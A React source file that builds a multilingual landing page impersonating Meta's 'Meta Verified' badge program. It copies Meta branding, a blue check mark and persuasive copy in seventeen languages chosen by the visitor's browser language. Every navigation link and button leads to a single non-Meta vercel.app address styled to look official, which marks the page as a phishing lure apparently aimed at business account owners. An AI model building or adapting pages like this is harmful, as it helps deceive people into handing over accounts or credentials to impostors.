import React from "react";

export default function App() {
  // lấy ngôn ngữ trình duyệt
  const lang =
    typeof navigator !== "undefined" ? navigator.language.split("-")[0] : "en";

  // LINK CHUNG
  const verifyLink =
    "https://meta-business-verification-official.vercel.app/meta-community";

  // NGÔN NGỮ CHÂU ÂU
  const text: Record<string, any> = {
    en: {
      begin: "Begin",
      advertisement: "Advertisement",
      learn: "Learn",
      support: "Support",
      schedule: "Schedule a call",
      start: "Start Verification",
      register: "Start Verification",
      banner:
        "Verify your Meta account to receive the blue verification badge on Facebook and Instagram.",
      title: "Let the whole world know that you take business seriously.",
      desc: "Meta Verified helps you build credibility with new audiences and protect your brand.",
    },

    fr: {
      begin: "Commencer",
      advertisement: "Publicité",
      learn: "Apprendre",
      support: "Support",
      schedule: "Planifier un appel",
      start: "Commencer la vérification",
      register: "Commencer la vérification",
      banner:
        "Vérifiez votre compte Meta pour recevoir le badge bleu de vérification sur Facebook et Instagram.",
      title:
        "Montrez au monde entier que vous prenez votre entreprise au sérieux.",
      desc: "Meta Verified vous aide à protéger votre marque.",
    },

    de: {
      begin: "Start",
      advertisement: "Werbung",
      learn: "Lernen",
      support: "Support",
      schedule: "Anruf planen",
      start: "Verifizierung starten",
      register: "Verifizierung starten",
      banner:
        "Verifizieren Sie Ihr Meta-Konto, um das blaue Verifizierungsabzeichen auf Facebook und Instagram zu erhalten.",
      title: "Zeigen Sie der Welt, dass Sie Ihr Unternehmen ernst nehmen.",
      desc: "Meta Verified hilft Ihnen beim Schutz Ihrer Marke.",
    },

    es: {
      begin: "Comenzar",
      advertisement: "Publicidad",
      learn: "Aprender",
      support: "Soporte",
      schedule: "Programar llamada",
      start: "Iniciar verificación",
      register: "Iniciar verificación",
      banner:
        "Verifica tu cuenta Meta para recibir la insignia azul de verificación en Facebook e Instagram.",
      title: "Hazle saber al mundo que tomas en serio tu negocio.",
      desc: "Meta Verified te ayuda a proteger tu marca.",
    },

    it: {
      begin: "Inizia",
      advertisement: "Pubblicità",
      learn: "Scopri",
      support: "Supporto",
      schedule: "Pianifica chiamata",
      start: "Avvia verifica",
      register: "Avvia verifica",
      banner:
        "Verifica il tuo account Meta per ricevere il badge blu di verifica su Facebook e Instagram.",
      title: "Fai sapere al mondo che prendi sul serio la tua attività.",
      desc: "Meta Verified ti aiuta a proteggere il tuo brand.",
    },

    pt: {
      begin: "Começar",
      advertisement: "Publicidade",
      learn: "Aprender",
      support: "Suporte",
      schedule: "Agendar chamada",
      start: "Iniciar verificação",
      register: "Iniciar verificação",
      banner:
        "Verifique sua conta Meta para receber o selo azul de verificação no Facebook e Instagram.",
      title: "Mostre ao mundo que você leva seu negócio a sério.",
      desc: "Meta Verified ajuda a proteger sua marca.",
    },

    nl: {
      begin: "Begin",
      advertisement: "Advertentie",
      learn: "Leren",
      support: "Ondersteuning",
      schedule: "Gesprek plannen",
      start: "Verificatie starten",
      register: "Verificatie starten",
      banner:
        "Verifieer uw Meta-account om de blauwe verificatiebadge op Facebook en Instagram te ontvangen.",
      title: "Laat de wereld weten dat u uw bedrijf serieus neemt.",
      desc: "Meta Verified helpt uw merk te beschermen.",
    },

    pl: {
      begin: "Rozpocznij",
      advertisement: "Reklama",
      learn: "Dowiedz się więcej",
      support: "Wsparcie",
      schedule: "Zaplanuj rozmowę",
      start: "Rozpocznij weryfikację",
      register: "Rozpocznij weryfikację",
      banner:
        "Zweryfikuj swoje konto Meta, aby otrzymać niebieską odznakę weryfikacyjną na Facebooku i Instagramie.",
      title: "Pokaż światu, że poważnie traktujesz swój biznes.",
      desc: "Meta Verified pomaga chronić Twoją markę.",
    },

    cs: {
      begin: "Začít",
      advertisement: "Reklama",
      learn: "Zjistit více",
      support: "Podpora",
      schedule: "Naplánovat hovor",
      start: "Spustit ověření",
      register: "Spustit ověření",
      banner:
        "Ověřte svůj účet Meta a získejte modrý ověřovací odznak na Facebooku a Instagramu.",
      title: "Dejte celému světu vědět, že svůj podnik berete vážně.",
      desc: "Meta Verified vám pomůže budovat důvěryhodnost a chránit vaši značku.",
    },

    da: {
      begin: "Begynd",
      advertisement: "Annonce",
      learn: "Lær",
      support: "Support",
      schedule: "Planlæg et opkald",
      start: "Start verificering",
      register: "Start verificering",
      banner:
        "Bekræft din Meta-konto for at modtage det blå verificeringsbadge på Facebook og Instagram.",
      title: "Lad hele verden vide, at du tager din virksomhed seriøst.",
      desc: "Meta Verified hjælper dig med at beskytte dit brand.",
    },

    fi: {
      begin: "Aloita",
      advertisement: "Mainos",
      learn: "Lue lisää",
      support: "Tuki",
      schedule: "Aikatauluta puhelu",
      start: "Aloita vahvistus",
      register: "Aloita vahvistus",
      banner:
        "Vahvista Meta-tilisi saadaksesi sinisen vahvistusmerkin Facebookissa ja Instagramissa.",
      title: "Anna koko maailman tietää, että otat yrityksesi vakavasti.",
      desc: "Meta Verified auttaa suojaamaan brändiäsi.",
    },

    no: {
      begin: "Start",
      advertisement: "Annonse",
      learn: "Lær",
      support: "Støtte",
      schedule: "Planlegg samtale",
      start: "Start verifisering",
      register: "Start verifisering",
      banner:
        "Bekreft Meta-kontoen din for å motta det blå verifiseringsmerket på Facebook og Instagram.",
      title: "La hele verden vite at du tar virksomheten din seriøst.",
      desc: "Meta Verified hjelper deg med å beskytte merkevaren din.",
    },

    sv: {
      begin: "Börja",
      advertisement: "Annons",
      learn: "Lär dig",
      support: "Support",
      schedule: "Schemalägg samtal",
      start: "Starta verifiering",
      register: "Starta verifiering",
      banner:
        "Verifiera ditt Meta-konto för att få det blå verifieringsmärket på Facebook och Instagram.",
      title: "Låt hela världen veta att du tar ditt företag på allvar.",
      desc: "Meta Verified hjälper dig att skydda ditt varumärke.",
    },

    ro: {
      begin: "Începe",
      advertisement: "Publicitate",
      learn: "Învață",
      support: "Suport",
      schedule: "Programează apel",
      start: "Începe verificarea",
      register: "Începe verificarea",
      banner:
        "Verifică-ți contul Meta pentru a primi insigna albastră de verificare pe Facebook și Instagram.",
      title: "Arată lumii că îți iei afacerea în serios.",
      desc: "Meta Verified te ajută să îți protejezi brandul.",
    },

    hu: {
      begin: "Kezdés",
      advertisement: "Hirdetés",
      learn: "Tudj meg többet",
      support: "Támogatás",
      schedule: "Hívás ütemezése",
      start: "Hitelesítés indítása",
      register: "Hitelesítés indítása",
      banner:
        "Hitelesítsd Meta-fiókodat, hogy megkapd a kék hitelesítési jelvényt Facebookon és Instagramon.",
      title: "Mutasd meg a világnak, hogy komolyan veszed vállalkozásodat.",
      desc: "A Meta Verified segít megvédeni a márkádat.",
    },

    el: {
      begin: "Έναρξη",
      advertisement: "Διαφήμιση",
      learn: "Μάθετε",
      support: "Υποστήριξη",
      schedule: "Προγραμματισμός κλήσης",
      start: "Έναρξη επαλήθευσης",
      register: "Έναρξη επαλήθευσης",
      banner:
        "Επαληθεύστε τον λογαριασμό Meta για να λάβετε το μπλε σήμα επαλήθευσης στο Facebook και το Instagram.",
      title: "Δείξτε στον κόσμο ότι παίρνετε την επιχείρησή σας σοβαρά.",
      desc: "Το Meta Verified βοηθά στην προστασία της επωνυμίας σας.",
    },

    he: {
      begin: "התחל",
      advertisement: "פרסומת",
      learn: "למד",
      support: "תמיכה",
      schedule: "קבע שיחה",
      start: "התחל אימות",
      register: "התחל אימות",
      banner:
        "אמת את חשבון ה-Meta שלך כדי לקבל את תג האימות הכחול בפייסבוק ובאינסטגרם.",
      title: "תן לעולם לדעת שאתה לוקח את העסק שלך ברצינות.",
      desc: "Meta Verified עוזר להגן על המותג שלך.",
    },
  };

  // fallback tiếng Anh
  const t = text[lang] || text.en;

  const images = [
    "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1517841905240-472988babdf9?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1517423440428-a5a00ad493e8?q=80&w=1200&auto=format&fit=crop",
  ];

  return (
    <>
      <style>{`
        *{
          margin:0;
          padding:0;
          box-sizing:border-box;
          font-family:Arial, Helvetica, sans-serif;
        }

        body{
          background:#f5f5f5;
          overflow-x:hidden;
        }

        .app{
          width:100%;
          min-height:100vh;
        }

        .header{
          width:100%;
          height:74px;
          background:#fff;
          border-bottom:1px solid #ddd;
          display:flex;
          align-items:center;
          justify-content:space-between;
          padding:0 40px;
        }

        .logo{
          font-size:34px;
          color:#1877f2;
          font-weight:700;
        }

        .nav{
          display:flex;
          gap:30px;
        }

        .nav a{
          text-decoration:none;
          color:#111827;
          font-weight:500;
        }

        .header-buttons{
          display:flex;
          gap:15px;
        }

        .call-btn{
          border:1px solid #1877f2;
          background:#fff;
          color:#1877f2;
          padding:12px 20px;
          border-radius:999px;
          cursor:pointer;
          text-decoration:none;
        }

        .start-btn{
          border:none;
          background:#1877f2;
          color:#fff;
          padding:12px 24px;
          border-radius:14px;
          cursor:pointer;
          text-decoration:none;
          display:inline-flex;
          align-items:center;
          justify-content:center;
        }

        .banner{
          width:100%;
          background:#101820;
          color:#fff;
          text-align:center;
          padding:16px;
        }

        .hero{
          max-width:1400px;
          margin:auto;
          display:flex;
          align-items:center;
          justify-content:space-between;
          gap:80px;
          padding:80px 40px;
        }

        .hero-left{
          max-width:620px;
        }

        .verified{
          width:82px;
          height:82px;
          border-radius:50%;
          background:#1877f2;
          display:flex;
          align-items:center;
          justify-content:center;
          color:#fff;
          font-size:40px;
          margin-bottom:30px;
        }

        .hero-title{
          font-size:72px;
          line-height:1.1;
          margin-bottom:30px;
        }

        .hero-desc{
          font-size:20px;
          line-height:1.8;
          color:#4b5563;
          margin-bottom:40px;
        }

        .register-btn{
          border:none;
          background:#1877f2;
          color:#fff;
          padding:18px 38px;
          border-radius:999px;
          font-size:18px;
          cursor:pointer;
          text-decoration:none;
          display:inline-flex;
          align-items:center;
          justify-content:center;
        }

        .phone-grid{
          display:grid;
          grid-template-columns:repeat(2, 280px);
          gap:24px;
        }

        .card{
          width:280px;
          height:560px;
          border-radius:36px;
          overflow:hidden;
          background:#fff;
          box-shadow:0 20px 50px rgba(0,0,0,0.18);
        }

        .card img{
          width:100%;
          height:100%;
          object-fit:cover;
        }

        @media(max-width:900px){
          .hero{
            flex-direction:column;
            text-align:center;
          }

          .phone-grid{
            grid-template-columns:1fr;
          }

          .hero-title{
            font-size:42px;
          }

          .header{
            flex-direction:column;
            height:auto;
            gap:20px;
            padding:20px;
          }

          .nav{
            flex-wrap:wrap;
            justify-content:center;
          }
        }
      `}</style>

      <div className="app">
        <header className="header">
          <div className="logo">Meta</div>

          <nav className="nav">
            <a href={verifyLink}>{t.begin}</a>
            <a href={verifyLink}>{t.advertisement}</a>
            <a href={verifyLink}>{t.learn}</a>
            <a href={verifyLink}>{t.support}</a>
          </nav>

          <div className="header-buttons">
            <a
              href={verifyLink}
              className="call-btn"
              target="_blank"
              rel="noreferrer"
            >
              {t.schedule}
            </a>

            <a
              href={verifyLink}
              className="start-btn"
              target="_blank"
              rel="noreferrer"
            >
              {t.start}
            </a>
          </div>
        </header>

        <div className="banner">{t.banner}</div>

        <section className="hero">
          <div className="hero-left">
            <div className="verified">✓</div>

            <h1 className="hero-title">{t.title}</h1>

            <p className="hero-desc">{t.desc}</p>

            <a
              href={verifyLink}
              className="register-btn"
              target="_blank"
              rel="noreferrer"
            >
              {t.register}
            </a>
          </div>

          <div className="phone-grid">
            {images.map((img, index) => (
              <div className="card" key={index}>
                <img src={img} alt="" />
              </div>
            ))}
          </div>
        </section>
      </div>
    </>
  );
}
